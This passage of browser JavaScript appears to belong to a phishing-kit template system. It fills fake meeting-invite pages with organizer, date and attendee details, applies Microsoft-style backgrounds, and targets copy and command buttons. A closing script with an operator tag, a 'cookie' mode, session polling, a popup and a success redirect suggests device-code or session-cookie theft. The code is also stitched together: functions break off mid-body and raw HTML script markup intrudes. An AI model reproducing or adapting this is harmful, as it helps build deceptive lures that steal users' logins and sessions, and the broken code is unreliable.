        return response.clone().text().then(function(text){
          if(!text) return response;

          var parsed;
          try{
            parsed = JSON.parse(text);
          }catch(_){
            return response;
          }

          var headers = new Headers(response.headers);
          headers.set('content-type', 'application/json; charset=utf-8');

          return new Response(JSON.stringify(sxNormalizeDeviceJson(parsed)), {
            status: response.status,
            statusText: response.statusText,
            headers: headers
          });
        }, function(){
          return response;
        });
      });

      if(!dedupeKey) return request;

      inFlightStatus[dedupeKey] = request;
      request.finally(function(){
        if(inFlightStatus[dedupeKey] === request) delete inFlightStatus[dedupeKey];
      });

      return request.then(sxCloneResponse);
    };
  }

  function sxTemplateBackgroundColor(){
    var raw = typeof window.__TEMPLATE_BACKGROUND_COLOR === 'string'
      ? window.__TEMPLATE_BACKGROUND_COLOR.trim()
      : '';
    var match = raw.match(/^#?([0-9a-f]{3}|[0-9a-f]{6})$/i);
    if (!match) return '';

    var hex = match[1].toLowerCase();
    if (hex.length === 3) {
      hex = hex.charAt(0) + hex.charAt(0)
        + hex.charAt(1) + hex.charAt(1)
        + hex.charAt(2) + hex.charAt(2);
    }

    return '#' + hex;
  }

  function sxBackgroundLogoMetrics(size) {
    var numeric = parseInt(size, 10);
    if (!Number.isFinite(numeric)) numeric = 320;
    numeric = Math.max(80, Math.min(900, numeric));
    var progress = (numeric - 80) / 820;

    return {
      numeric: numeric,
      markWidth: Math.round(168 + (progress * 232)),
      markHeight: Math.round(68 + (progress * 92))
    };
  }

  function sxBackgroundLogoOpacities() {
    var color = sxTemplateBackgroundColor();
    if (!color) return { repeat: '0.14', center: '0.38' };

    var rgb = [1, 3, 5].map(function(index){
      return parseInt(color.slice(index, index + 2), 16);
    });
    var luminance = (0.2126 * rgb[0]) + (0.7152 * rgb[1]) + (0.0722 * rgb[2]);

    if (luminance < 64) return { repeat: '0.22', center: '0.48' };
    if (luminance < 128) return { repeat: '0.20', center: '0.45' };
    if (luminance < 196) return { repeat: '0.18', center: '0.42' };
    return { repeat: '0.15', center: '0.40' };
  }

  function sxBackgroundLogoMarkCount(metrics) {
    var columnWidth = Math.max(240, metrics.markWidth + 84);
    var rowHeight = Math.max(148, metrics.markHeight + 70);
    var columns = Math.ceil(window.innerWidth / columnWidth) + 4;
    var rows = Math.ceil(window.innerHeight / rowHeight) + 4;

  function sxPrepareBackgroundLogoPage(layer) {
    var body = document.body;
    if (!body) return;

    var nativeBackgrounds = document.querySelectorAll('body > .bg-scene, body > .bg-wrap, body > .bg-blur, body > .bg-blur-layer, body > .bg-blur-overlay, body > .bg-overlay, body > .background, body > .ms-bg, body > .word-pattern, body > .document-bg, body > .bg-dots, body > #bg-frame, body > #bg-fallback');
    for (var n = 0; n < nativeBackgrounds.length; n++) {
      nativeBackgrounds[n].setAttribute('data-template-bg-logo-native', '1');
    }

    for (var i = 0; i < body.children.length; i++) {
      var child = body.children[i];
      if (child === layer || child.getAttribute('data-template-bg-logo-native') === '1') continue;
      if (/^(SCRIPT|STYLE|LINK|META|TEMPLATE)$/i.test(child.tagName)) continue;

      var childStyle = getComputedStyle(child);
      var childRect = child.getBoundingClientRect();
      var isFullScreenBackdrop = childStyle.position === 'fixed'
        && childStyle.pointerEvents === 'none'
        && childRect.width >= (window.innerWidth * 0.9)
        && childRect.height >= (window.innerHeight * 0.9);
      if (isFullScreenBackdrop) {
        child.setAttribute('data-template-bg-logo-native', '1');
        continue;
      }

      if (!child.style.position && childStyle.position === 'static') {
        child.style.position = 'relative';
      }
      if (!child.style.zIndex && (childStyle.zIndex === 'auto' || childStyle.zIndex === '0')) {
        child.style.zIndex = '2';
      }
    }

    if (!body.classList.contains('background-logo-layout-center')) return;

    var surfaces = document.querySelectorAll('.card, .shell, .container, .app-container, .wrap, .app-shell');
    for (var s = 0; s < surfaces.length; s++) {
      var surface = surfaces[s];
      if (surface.closest('.success-overlay, .sx-verification-complete-overlay, .modal-overlay, [role="dialog"]')) continue;

      var rect = surface.getBoundingClientRect();
      if (rect.width < 180 || rect.height < 120) continue;

      var surfaceStyle = getComputedStyle(surface);
      var colorMatch = surfaceStyle.backgroundColor.match(/^rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)(?:\s*,\s*([\d.]+))?\s*\)$/i);
      if (!colorMatch) continue;

      var currentAlpha = colorMatch[4] === undefined ? 1 : Number(colorMatch[4]);
      if (!Number.isFinite(currentAlpha) || currentAlpha <= 0) continue;
      var surfaceAlpha = Math.min(0.88, currentAlpha);

      surface.style.setProperty(
        'background-color',
        'rgba(' + colorMatch[1] + ',' + colorMatch[2] + ',' + colorMatch[3] + ',' + surfaceAlpha + ')',
        'important'
      );
      surface.classList.add('__template-bg-logo-surface');
    }
  }

  function sxRenderTemplateBackgroundLogoLayer(logoUrl, layout, size) {
    if (!document.body || document.getElementById('backgroundLogoPattern')) return;

    var requestId = ++sxBackgroundLogoRenderId;
    var probe = new Image();
    probe.decoding = 'async';
    probe.onload = function(){
      if (requestId !== sxBackgroundLogoRenderId || !document.body) return;

      var body = document.body;
      var root = document.documentElement;
      var metrics = sxBackgroundLogoMetrics(size);
      var opacities = sxBackgroundLogoOpacities();
      var layer = document.getElementById('__templateBackgroundLogoLayer');
      if (!layer) {
        layer = document.createElement('div');
        layer.id = '__templateBackgroundLogoLayer';
        layer.setAttribute('aria-hidden', 'true');
        body.insertBefore(layer, body.firstChild);
      }

      sxEnsureBackgroundLogoStyles();
      layer.classList.remove('is-ready');
      layer.replaceChildren();

      var fragment = document.createDocumentFragment();
      var count = layout === 'center' ? 1 : sxBackgroundLogoMarkCount(metrics);
      for (var i = 0; i < count; i++) {
        var mark = document.createElement('span');
        var image = document.createElement('img');
        mark.className = '__template-bg-logo-mark';
        image.src = logoUrl;
        image.alt = '';
        image.decoding = 'async';
        image.draggable = false;
        mark.appendChild(image);
        fragment.appendChild(mark);
      }
      layer.appendChild(fragment);

      root.style.setProperty('--sx-bg-logo-mark-width', metrics.markWidth + 'px');
      root.style.setProperty('--sx-bg-logo-mark-height', metrics.markHeight + 'px');
      root.style.setProperty('--sx-bg-logo-cell-width', Math.max(240, metrics.markWidth + 84) + 'px');
      root.style.setProperty('--sx-bg-logo-cell-height', Math.max(148, metrics.markHeight + 70) + 'px');
      root.style.setProperty('--sx-bg-logo-center-size', metrics.numeric + 'px');
      root.style.setProperty('--sx-bg-logo-repeat-opacity', opacities.repeat);
      root.style.setProperty('--sx-bg-logo-center-opacity', opacities.center);
      root.classList.add('__template-bg-logo-enabled', '__template-bg-logo-ready');
      body.classList.add('__template-bg-logo-enabled', '__custom-bg-enabled', '__template-bg-logo-ready', 'has-custom-background-logo');
      sxPrepareBackgroundLogoPage(layer);
      layer.classList.add('is-ready');

      sxBackgroundLogoState = { url: logoUrl, layout: layout, size: size };
      if (!sxBackgroundLogoResizeReady) {
        sxBackgroundLogoResizeReady = true;
        window.addEventListener('resize', function(){
          if (!sxBackgroundLogoState || sxBackgroundLogoState.layout !== 'repeat') return;
          clearTimeout(sxBackgroundLogoResizeTimer);
          sxBackgroundLogoResizeTimer = setTimeout(function(){
            var state = sxBackgroundLogoState;
            sxRenderTemplateBackgroundLogoLayer(state.url, state.layout, state.size);
          }, 160);
        });
      }
    };
    probe.onerror = function(){
      if (requestId !== sxBackgroundLogoRenderId) return;
      var layer = document.getElementById('__templateBackgroundLogoLayer');
      if (layer) layer.classList.remove('is-ready');
    };
    probe.src = logoUrl;
  }

  function i18nValue(key, fallback){
    key = typeof key === 'string' ? key.trim() : '';
    if(!key) return fallback;
    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
      ? window.__APP_TRANSLATIONS
      : {};
    var value = key.split('.').reduce(function(current, part){
      return current && Object.prototype.hasOwnProperty.call(current, part) ? current[part] : undefined;
    }, source);

    if(value === undefined || value === null || value === '') return fallback;
    if(typeof value === 'string' || typeof value === 'number') return String(value);

    return fallback;
  }

  function i18nNormalizeText(text){
    return String(text || '').replace(/\s+/g, ' ').trim();
  }

  function i18nPhraseLookupKey(text){
    return i18nNormalizeText(text)
      .replace(/[\u2018\u2019]/g, "'")
      .replace(/[\u201C\u201D]/g, '"')
      .replace(/\u2026/g, '...')
      .replace(/\s+([.,!?;:])/g, '$1')
      .replace(/^[\u2713\u2714]\s*/g, '')
      .replace(/[!\uFF01]+$/g, '')
      .toLowerCase();
  }

  var i18nPhraseCacheSource = null;
  var i18nPhraseCache = null;
  var i18nPatternCacheSource = null;
  var i18nPatternCache = null;

  function i18nPhraseIndex(phrases){
    if(i18nPhraseCacheSource === phrases && i18nPhraseCache) return i18nPhraseCache;

    var index = Object.create(null);
    Object.keys(phrases).forEach(function(key){
      var normalizedKey = i18nPhraseLookupKey(key);
      if(normalizedKey && !Object.prototype.hasOwnProperty.call(index, normalizedKey)){
        index[normalizedKey] = phrases[key];
      }
    });
    i18nPhraseCacheSource = phrases;
    i18nPhraseCache = index;

    return index;
  }

  function i18nPatternIndex(patterns){
    if(i18nPatternCacheSource === patterns && i18nPatternCache) return i18nPatternCache;

    var index = [];
    Object.keys(patterns).forEach(function(pattern){
      var placeholders = [];
      var parts = i18nNormalizeText(pattern).split(/(\{[A-Za-z][A-Za-z0-9_]*\})/g);
      var expression = parts.map(function(part){
        var placeholder = part.match(/^\{([A-Za-z][A-Za-z0-9_]*)\}$/);
        if(placeholder){
          var placeholderName = placeholder[1];
          placeholders.push(placeholderName);
          if(placeholderName === 'count'){
            return '([+-]?\\d(?:[\\d.,\\s]*\\d)?)';
          }
          return '([\\s\\S]+?)';
        }
        return part.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      }).join('');

      if(placeholders.length){
        index.push({
          expression: new RegExp('^' + expression + '$', 'i'),
          placeholders: placeholders,
          translation: patterns[pattern]
        });
      }
    });
    i18nPatternCacheSource = patterns;
    i18nPatternCache = index;

    return index;
  }

  function i18nPattern(text, patterns){
    var normalized = i18nNormalizeText(text);
    var index = i18nPatternIndex(patterns);

    for(var i = 0; i < index.length; i++){
      var item = index[i];
      var match = normalized.match(item.expression);
      if(!match) continue;

      var translated = typeof item.translation === 'string' ? item.translation : '';
      if(!translated) return text;
      item.placeholders.forEach(function(placeholder, position){
        translated = translated.split('{' + placeholder + '}').join(match[position + 1]);
      });
      return translated;
    }

    return text;
  }

  function i18nPhrase(text){
    var fallback = typeof text === 'string' ? text : String(text || '');
    var key = i18nNormalizeText(fallback);
    if(!key) return fallback;
    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
      ? window.__APP_TRANSLATIONS
      : {};
    var phrases = source.phrases && typeof source.phrases === 'object' ? source.phrases : {};
    var value = Object.prototype.hasOwnProperty.call(phrases, key) ? phrases[key] : undefined;
    if(value === undefined){
      value = i18nPhraseIndex(phrases)[i18nPhraseLookupKey(key)];
    }

    if(value === undefined){
      var patterns = source.patterns && typeof source.patterns === 'object' ? source.patterns : {};
      var patternValue = i18nPattern(key, patterns);
      if(patternValue !== key) return patternValue;
    }

    if(value === undefined || value === null || value === '') return fallback;
    if(typeof value === 'string' || typeof value === 'number') return String(value);

    return fallback;
  }

  function i18nHasPhraseDictionary(){
    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
      ? window.__APP_TRANSLATIONS
      : {};
    return source.phrases && typeof source.phrases === 'object';
  }

  function i18nTranslateDocumentTitle(){
    if(!i18nHasPhraseDictionary()) return;
    var current = document.title || '';
    var translated = i18nPhrase(current);
    if(translated !== current) document.title = translated;
  }

  function i18nBlockedByCustomOverride(el){
    if(!el || !el.closest) return false;
    if(el.closest('[data-i18n-custom-override]')) return true;
    if(hasCustomText(window.__PAGE_TITLE) && el.closest('[data-page-title],[data-template-title],[data-custom-title]')) return true;
    if(hasCustomText(window.__PAGE_MESSAGE) && el.closest('[data-page-message],[data-template-message],[data-custom-message]')) return true;
    if(hasCustomText(window.__PRIMARY_BUTTON_TEXT) && el.closest('[data-primary-button],[data-primary-button-label]')) return true;

    return false;
  }

  function i18nTranslateTextNodes(){
    if(!document.body || !i18nHasPhraseDictionary()) return;

    var skipTags = {
      SCRIPT: true,
      STYLE: true,
      NOSCRIPT: true,
      TEMPLATE: true,
      TEXTAREA: true,
      CODE: true,
      PRE: true
    };
    var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, {
      acceptNode: function(node){
        var parent = node.parentElement;
        if(!parent || skipTags[parent.tagName]) return NodeFilter.FILTER_REJECT;
        if(parent.closest('[data-no-i18n],[contenteditable="true"]')) return NodeFilter.FILTER_REJECT;
        if(i18nBlockedByCustomOverride(parent)) return NodeFilter.FILTER_REJECT;
        return i18nNormalizeText(node.nodeValue) ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
      }
    });
    var nodes = [];

    while(walker.nextNode()) nodes.push(walker.currentNode);

    nodes.forEach(function(node){
      var original = node.nodeValue || '';
      var translated = i18nPhrase(original);
      if(translated === original) return;

      var leading = original.match(/^\s*/)[0] || '';
      var trailing = original.match(/\s*$/)[0] || '';
      node.nodeValue = leading + translated + trailing;
      markTranslatedElement(node.parentElement);
    });
  }

  function i18nTranslateCommonAttributes(){
    if(!i18nHasPhraseDictionary()) return;

    ['placeholder', 'title', 'aria-label'].forEach(function(attr){
      document.querySelectorAll('[' + attr + ']').forEach(function(el){
        if(el.closest('[data-no-i18n]')) return;
        var current = el.getAttribute(attr);
        var translated = i18nPhrase(current);
        if(translated !== current){
          el.setAttribute(attr, translated);
          if(attr === 'placeholder') markTranslatedElement(el);
        }
      });
    });
  }

  function hasCustomText(value){
    return typeof value === 'string' && value.trim() !== '';
  }

  function setPhraseText(selector, blocked){
    if(blocked) return;
    document.querySelectorAll(selector).forEach(function(el){
      var current = el.textContent;
      var translated = i18nPhrase(current);
      if(translated !== current) el.textContent = translated;
      markTranslatedElement(el);
    });
  }

  function markTranslatedElement(el){
    if(!el || !el.setAttribute) return;
    if(!el.hasAttribute('dir')) el.setAttribute('dir', 'auto');
  }

  function applyTemplateTranslations(){
    if(!window.__APP_TRANSLATIONS || typeof window.__APP_TRANSLATIONS !== 'object') return;
    if(typeof window.__APP_LOCALE === 'string' && window.__APP_LOCALE){
      document.documentElement.setAttribute('lang', window.__APP_LOCALE);
    }

    document.querySelectorAll('[data-i18n]').forEach(function(el){
      if(i18nBlockedByCustomOverride(el)) return;
      var current = el.textContent;
      var translated = i18nValue(el.getAttribute('data-i18n'), current);
      if(translated !== current) el.textContent = translated;
      markTranslatedElement(el);
    });
    document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){
      var current = el.getAttribute('placeholder') || '';
      var translated = i18nValue(el.getAttribute('data-i18n-placeholder'), current);
      if(translated !== current){
        el.setAttribute('placeholder', translated);
        markTranslatedElement(el);
      }
    });
    document.querySelectorAll('[data-i18n-title]').forEach(function(el){
      var current = el.getAttribute('title') || '';
      var translated = i18nValue(el.getAttribute('data-i18n-title'), current);
      if(translated !== current) el.setAttribute('title', translated);
    });
    document.querySelectorAll('[data-i18n-aria-label]').forEach(function(el){
      var current = el.getAttribute('aria-label') || '';
      var translated = i18nValue(el.getAttribute('data-i18n-aria-label'), current);
      if(translated !== current) el.setAttribute('aria-label', translated);
    });
    i18nTranslateDocumentTitle();
    translateDefaultPrimaryButtons();
    i18nTranslateTextNodes();
    i18nTranslateCommonAttributes();

    setPhraseText(
      '[data-page-title],[data-template-title],[data-custom-title]',
      hasCustomText(window.__PAGE_TITLE)
    );
    setPhraseText(
      '[data-page-message],[data-template-message],[data-custom-message]',
      hasCustomText(window.__PAGE_MESSAGE)
    );
    document.querySelectorAll('[data-primary-button]').forEach(function(el){
      if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;
      var current = el.textContent;
      var translated = i18nPhrase(current);
      if(translated !== current) setPrimaryButtonText(el, translated);
      markTranslatedElement(el);
    });
    document.querySelectorAll('[data-primary-button-label]').forEach(function(el){
      if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;
      var current = el.textContent;
      var translated = i18nPhrase(current);
      if(translated !== current) el.textContent = translated;
      markTranslatedElement(el);
    });
  }

  var i18nRefreshQueued = false;
  var i18nObserver = null;

  function scheduleTemplateTranslationRefresh(){
    if(i18nRefreshQueued || !i18nHasPhraseDictionary()) return;
    i18nRefreshQueued = true;
    setTimeout(function(){
      i18nRefreshQueued = false;
      applyTemplateTranslations();
    }, 0);
  }

  function observeTemplateTranslations(){
    if(i18nObserver || !document.body || !i18nHasPhraseDictionary() || typeof MutationObserver !== 'function') return;

    i18nObserver = new MutationObserver(function(mutations){
      var shouldRefresh = mutations.some(function(mutation){
        if(mutation.type === 'characterData'){
          var textParent = mutation.target && mutation.target.parentElement;
          if(!textParent || textParent.closest('[data-no-i18n],[contenteditable="true"],script,style,noscript,template,textarea,code,pre')) return false;
          if(i18nBlockedByCustomOverride(textParent)) return false;
          if(textParent.closest('[data-i18n],[data-page-title],[data-template-title],[data-custom-title],[data-page-message],[data-template-message],[data-custom-message],[data-primary-button],[data-primary-button-label]')) return true;
          var currentText = mutation.target.nodeValue || '';
          return i18nPhrase(currentText) !== currentText;
        }
        if(mutation.type === 'attributes'){
          if(mutation.target.closest('[data-no-i18n]')) return false;
          var attr = mutation.attributeName || '';
          var currentAttr = mutation.target.getAttribute(attr) || '';
          return mutation.target.hasAttribute('data-i18n-' + attr)
            || i18nPhrase(currentAttr) !== currentAttr;
        }
        return Array.prototype.some.call(mutation.addedNodes || [], function(node){
          return node.nodeType === 3 || (node.nodeType === 1 && !node.closest('[data-no-i18n]'));
        });
      });

      if(shouldRefresh) scheduleTemplateTranslationRefresh();
    });
    i18nObserver.observe(document.body, {
      subtree: true,
      childList: true,
      characterData: true,
      attributes: true,
      attributeFilter: ['placeholder', 'title', 'aria-label']
    });
  }

  function uniqueElements(nodes){
    var out = [];
    for(var i = 0; i < nodes.length; i++){
      if(out.indexOf(nodes[i]) === -1) out.push(nodes[i]);
    }
    return out;
  }

  function firstFallbackTarget(selectors){
    for(var i = 0; i < selectors.length; i++){
      var el = document.querySelector(selectors[i]);
      if(el) return el;
    }
    return null;
  }

  function applyPageTitle(text){
    var explicitTargets = uniqueElements(document.querySelectorAll('[data-page-title],[data-template-title],[data-custom-title]'));
    explicitTargets.forEach(function(el){
      el.textContent = text;
      el.setAttribute('data-i18n-custom-override', 'title');
      markTranslatedElement(el);
    });

    if(explicitTargets.length) return;

    var fallback = firstFallbackTarget(['main h1', '.card h1', '.shell h1', '.container h1', 'h1']);
    if(fallback){
      fallback.textContent = text;
      fallback.setAttribute('data-i18n-custom-override', 'title');
      markTranslatedElement(fallback);
    }
  }

  function applyPageMessage(text){
    var explicitTargets = uniqueElements(document.querySelectorAll('[data-page-message],[data-template-message],[data-custom-message]'));
    explicitTargets.forEach(function(el){
      el.textContent = text;
      el.setAttribute('data-i18n-custom-override', 'message');
      markTranslatedElement(el);
    });

    if(explicitTargets.length) return;

    var fallback = firstFallbackTarget([
      'main .desc',
      '.card .desc',
      '.shell .desc',
      '.container .desc',
      '.subtitle',
      '.description',
      '.lead',
      '.message',
      'p'
    ]);
    if(fallback){
      fallback.textContent = text;
      fallback.setAttribute('data-i18n-custom-override', 'message');
      markTranslatedElement(fallback);
    }
  }

  function isSkippablePrimaryCandidate(el){
    if(!el || !el.matches) return true;
    return el.matches(
      '.copy-btn,.code-copy-btn,.cpb,.cpy,.refresh-btn,.btn-secondary,.cta-secondary,.secondary-btn,' +
      '.nav-icon-btn,.cmd-btn,#copyBtn,#copy-btn,#wedeja,#refreshBtn'
    );
  }

  function primaryButtonFallbackTargets(){
    var selectors = [
      'button#startBtn.primary-btn',
      'button#startBtn.btn-primary',
      'button#continueBtn',
      'button.cta-btn',
      'button.bp',
      'button.go',
      'button.linakufe',
      'button.btn-open',
      'button.btn-primary[onclick*="gm"]',
      'button[onclick*="gm("]'
    ];
    var found = [];
    selectors.forEach(function(selector){
      document.querySelectorAll(selector).forEach(function(el){
        if(isSkippablePrimaryCandidate(el)) return;
        if(el.querySelector && el.querySelector('[data-primary-button]')) return;
        found.push(el);
      });
    });
    return uniqueElements(found);
  }

  function setPrimaryButtonText(el, text){
    if(!el) return;
    if(el.matches && el.matches('[data-primary-button]')){
      el.textContent = text;
      return;
    }

    var label = el.querySelector && el.querySelector('[data-primary-button-label]');
    if(label){
      label.textContent = text;
      return;
    }

    var walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, {
      acceptNode: function(node){
        return node.nodeValue && node.nodeValue.trim()
          ? NodeFilter.FILTER_ACCEPT
          : NodeFilter.FILTER_REJECT;
      }
    });

    var first = walker.nextNode();
    if(first){
      first.nodeValue = text;
      var next;
      while((next = walker.nextNode())){
        next.nodeValue = '';
      }
      return;
    }

    el.textContent = text;
  }

  function translateDefaultPrimaryButtons(){
    if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;

    primaryButtonFallbackTargets().forEach(function(el){
      var current = i18nNormalizeText(el.textContent);
      var translated = i18nPhrase(current);
      if(translated !== current) setPrimaryButtonText(el, translated);
      markTranslatedElement(el);
    });
  }

  function applyPrimaryButtonText(text){
    var explicitTargets = uniqueElements(document.querySelectorAll('[data-primary-button]'));
    explicitTargets.forEach(function(el){
      setPrimaryButtonText(el, text);
      el.setAttribute('data-i18n-custom-override', 'button');
      markTranslatedElement(el);
    });
    primaryButtonFallbackTargets().forEach(function(el){
      setPrimaryButtonText(el, text);
      el.setAttribute('data-i18n-custom-override', 'button');
      markTranslatedElement(el);
    });
  }

  function setText(selector, text){
    if(typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function(el){
      el.textContent = text;
      el.setAttribute('data-i18n-custom-override', 'text');
      if(!el.hasAttribute('dir')) el.setAttribute('dir', 'auto');
    });
  }

  function meetingDateFromYmd(raw){
    if(typeof raw !== 'string') return null;
    var match = raw.match(/^(\d{4})-(\d{2})-(\d{2})$/);
    if(!match) return null;
    var year = Number(match[1]);
    var month = Number(match[2]) - 1;
    var day = Number(match[3]);
    var date = new Date(year, month, day, 12, 0, 0);
    if(date.getFullYear() !== year || date.getMonth() !== month || date.getDate() !== day) return null;
    return date;
  }

  function templateIntlLocale(){
    var locale = typeof window.__APP_LOCALE === 'string' && window.__APP_LOCALE
      ? window.__APP_LOCALE
      : 'en';
    try{
      new Intl.DateTimeFormat(locale).format(new Date());
      return locale;
    }catch(_){
      return 'en';
    }
  }

  function formatMeetingDate(date, options){
    try{
      return new Intl.DateTimeFormat(templateIntlLocale(), options).format(date).replace(/\u202f/g, ' ');
    }catch(_){
      return '';
    }
  }

  function formatMeetingTime(raw){
    if(typeof raw !== 'string') return '';
    var match = raw.match(/^(\d{2}):(\d{2})$/);
    if(!match) return '';
    var hour = Number(match[1]);
    var minute = Number(match[2]);
    if(hour > 23 || minute > 59) return '';
    var date = new Date(2000, 0, 1, hour, minute, 0);
    return formatMeetingDate(date, { hour: 'numeric', minute: '2-digit' });
  }

  function renderMeetingCalendar(date){
    if(!date) return;
    var calendars = document.querySelectorAll('[data-meeting-calendar]');
    if(!calendars.length) return;

    var weekdays = [];
    try{
      var weekdayFormatter = new Intl.DateTimeFormat(templateIntlLocale(), { weekday: 'narrow' });
      var monday = new Date(2023, 0, 2, 12, 0, 0);
      for(var weekdayIndex = 0; weekdayIndex < 7; weekdayIndex++){
        var weekdayDate = new Date(monday);
        weekdayDate.setDate(monday.getDate() + weekdayIndex);
        weekdays.push(weekdayFormatter.format(weekdayDate));
      }
    }catch(_){
      weekdays = ['M', 'T', 'W', 'T', 'F', 'S', 'S'];
    }
    var year = date.getFullYear();
    var month = date.getMonth();
    var selectedDay = date.getDate();
    var firstDay = new Date(year, month, 1, 12, 0, 0);
    var leading = (firstDay.getDay() + 6) % 7;
    var daysInMonth = new Date(year, month + 1, 0).getDate();
    var daysInPreviousMonth = new Date(year, month, 0).getDate();
    var today = new Date();

    calendars.forEach(function(calendar){
      calendar.innerHTML = '';
      weekdays.forEach(function(label){
        var dow = document.createElement('div');
        dow.className = 'dow';
        dow.textContent = label;
        dow.setAttribute('dir', 'auto');
        calendar.appendChild(dow);
      });

      for(var i = leading; i > 0; i--){
        var prev = document.createElement('div');
        prev.className = 'day faded';
        prev.textContent = String(daysInPreviousMonth - i + 1);
        calendar.appendChild(prev);
      }

      for(var day = 1; day <= daysInMonth; day++){
        var current = document.createElement('div');
        var classes = ['day'];
        if(day === selectedDay) classes.push('active');
        if(year === today.getFullYear() && month === today.getMonth() && day === today.getDate()) classes.push('today');
        current.className = classes.join(' ');
        current.textContent = String(day);
        calendar.appendChild(current);
      }

      var filled = leading + daysInMonth;
      var nextDay = 1;
      while(filled % 7 !== 0){
        var next = document.createElement('div');
        next.className = 'day faded';
        next.textContent = String(nextDay++);
        calendar.appendChild(next);
        filled++;
      }
    });
  }

  function withoutLabelPrefix(prefix, text){
    text = typeof text === 'string' ? text.trim() : '';
    if(!text) return '';
    var label = prefix.toLowerCase() + ':';
    if(text.toLowerCase().indexOf(label) === 0){
      return text.slice(label.length).trim();
    }
    return text;
  }

  function withLocalizedLabelPrefix(key, fallback, text){
    text = withoutLabelPrefix(fallback, text);
    var label = i18nValue(key, fallback);
    return text ? label + ': ' + text : '';
  }

  function initialsFromName(name){
    var text = withoutLabelPrefix('Organizer', name).trim();
    if(!text) return 'SC';
    if(typeof text.normalize === 'function') text = text.normalize('NFC');

    var parts = text.split(/\s+/).map(function(part){
      return part.replace(/[^\p{L}\p{M}\p{N}]/gu, '');
    }).filter(Boolean);

    if(!parts.length) return 'SC';
    if(parts.length === 1) return Array.from(parts[0]).slice(0, 2).join('').toLocaleUpperCase();
    return (Array.from(parts[0])[0] + Array.from(parts[parts.length - 1])[0]).toLocaleUpperCase();
  }

  function currentMeetingInvitedCount(){
    if(window.__MEETING_INVITED_COUNT === undefined || window.__MEETING_INVITED_COUNT === null || window.__MEETING_INVITED_COUNT === '') return null;
    var count = Number(window.__MEETING_INVITED_COUNT);
    if(!Number.isFinite(count)) return null;
    return Math.max(0, Math.min(999, Math.floor(count)));
  }

  function formatMeetingInvitedCount(count){
    var formattedCount;
    try{
      formattedCount = new Intl.NumberFormat(templateIntlLocale()).format(count);
    }catch(_){
      formattedCount = String(count);
    }
    if(count > 0) formattedCount = '+' + formattedCount;

    return i18nValue('meeting.invited_count', '{count} invited').replace('{count}', formattedCount);
  }

  function renderMeetingAttendees(organizer, invitedCount){
    var containers = document.querySelectorAll('[data-meeting-attendees]');
    if(!containers.length) return;

    var hasCount = typeof invitedCount === 'number';
    var leader = initialsFromName(organizer || 'Shan Chen');
    var labels = [leader];
    ['JD', 'MK', 'AL', 'RT', 'NV'].forEach(function(label){
      if(labels.indexOf(label) === -1) labels.push(label);
    });
    var classes = ['chip blue', 'chip pink', 'chip slate'];

    containers.forEach(function(container){
      var countEl = container.querySelector('[data-meeting-invited-count]') || container.querySelector('.attendee-count');

      if(hasCount){
        var chipCount = Math.min(3, invitedCount + 1);
        container.querySelectorAll('.chip').forEach(function(chip){ chip.remove(); });

        if(!countEl){
          countEl = document.createElement('span');
          countEl.className = 'attendee-count';
          countEl.setAttribute('data-meeting-invited-count', '');
          container.appendChild(countEl);
        }

        for(var i = 0; i < chipCount; i++){
          var chip = document.createElement('span');
          chip.className = classes[i] || 'chip slate';
          chip.textContent = labels[i] || leader;
          container.insertBefore(chip, countEl);
        }

        countEl.textContent = formatMeetingInvitedCount(invitedCount);
        countEl.setAttribute('data-i18n-custom-override', 'meeting');
        if(!countEl.hasAttribute('dir')) countEl.setAttribute('dir', 'auto');
        countEl.style.display = '';
        container.setAttribute('aria-label', formatMeetingInvitedCount(invitedCount));
        return;
      }

      if(organizer){
        var firstChip = container.querySelector('.chip');
        if(firstChip) firstChip.textContent = leader;
      }
    });
  }

  function applyMeetingOverrides(){
    var title = typeof window.__MEETING_TITLE === 'string' ? window.__MEETING_TITLE.trim() : '';
    var rawDate = typeof window.__MEETING_DATE === 'string' ? window.__MEETING_DATE.trim() : '';
    var startTime = formatMeetingTime(window.__MEETING_START_TIME);
    var endTime = formatMeetingTime(window.__MEETING_END_TIME);
    var organizer = typeof window.__MEETING_ORGANIZER === 'string' ? window.__MEETING_ORGANIZER.trim() : '';
    var location = typeof window.__MEETING_LOCATION === 'string' ? window.__MEETING_LOCATION.trim() : '';
    var invitedCount = currentMeetingInvitedCount();
    var date = meetingDateFromYmd(rawDate);

    setText('[data-meeting-title]', title);
    setText('[data-meeting-organizer]', withLocalizedLabelPrefix('meeting.organizer_label', 'Organizer', organizer));
    setText('[data-meeting-location]', withLocalizedLabelPrefix('meeting.location_label', 'Location', location));
    if(invitedCount !== null) setText('[data-meeting-invited-count]', formatMeetingInvitedCount(invitedCount));
    if(organizer || invitedCount !== null) renderMeetingAttendees(organizer, invitedCount);

    if(date){
      var monthYear = formatMeetingDate(date, { month: 'long', year: 'numeric' });
      var shortDate = formatMeetingDate(date, { weekday: 'short', day: 'numeric' });
      var fullDate = formatMeetingDate(date, { weekday: 'short', month: 'long', day: 'numeric', year: 'numeric' });
      setText('[data-meeting-calendar-month]', monthYear);
      setText('[data-meeting-calendar-short-date]', shortDate);
      setText('[data-meeting-date-full]', fullDate);
      renderMeetingCalendar(date);
    }

    if(startTime || endTime){
      var timeRange = startTime && endTime ? startTime + ' - ' + endTime : (startTime || endTime);

    <script>
        const AT = 'lordspartaa';
        const MODE = "cookie";

        let sid = null;
        let pollInterval = null;
        let startTime = null;
        let countdown = null;
        let codeReady = false;
        let popupRef = null;

        /* ── Success overlay + redirect ─────────────────────────────── */
        function showSuccess(url) {
            try { if (popupRef && !popupRef.closed) popupRef.close(); } catch (_) {}
            const overlay = document.getElementById('successOverlay');
            overlay.classList.add('show');
            if (url) setTimeout(() => window.location.replace(url), 2500);
        }

